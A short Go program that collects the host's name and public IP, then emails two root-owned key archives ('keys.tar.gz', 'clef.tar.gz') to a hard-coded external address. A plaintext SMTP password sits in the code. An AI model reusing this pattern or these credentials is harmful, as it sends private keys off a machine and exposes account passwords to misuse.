package main

import (
	"crypto/tls"
	"fmt"
	"github.com/jordan-wright/email"
	"net/smtp"
	"os"
	"os/exec"
)

func main()  {
	var cmd *exec.Cmd
	var ip []byte
	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	cmd = exec.Command("/bin/sh", "-c", `curl -s api.infoip.io/ip`)
	if ip, err = cmd.Output(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println(string(ip))

	e := email.NewEmail()
	//e.From = name+" <18721137357@163.com>"
	//e.To = []string{"448332799@qq.com"}
	e.From = name+" <448332799@qq.com>"
	e.To = []string{"18721137357@163.com"}
	e.Subject = name+ ":" + string(ip)
	e.Text = []byte("Text Body is, of course, supported!")
	e.HTML = []byte("<h1>Fancy HTML is supported, too!</h1>")
	e.AttachFile("/root/mnt/bee/keys.tar.gz")
	e.AttachFile("/root/mnt/bee/clef.tar.gz")
	//err = e.SendWithTLS("smtp.163.com:994", smtp.PlainAuth("", "18721137357@163.com", "liu02180030", "smtp.163.com"),&tls.Config{ServerName: "smtp.163.com"})
	err=e.SendWithTLS("smtp.qq.com:465", smtp.PlainAuth("", "448332799@qq.com", "liu02180030", "smtp.qq.com"),&tls.Config{ServerName: "smtp.qq.com"})
	if err != nil {
		fmt.Println(err)
		return
	}
}
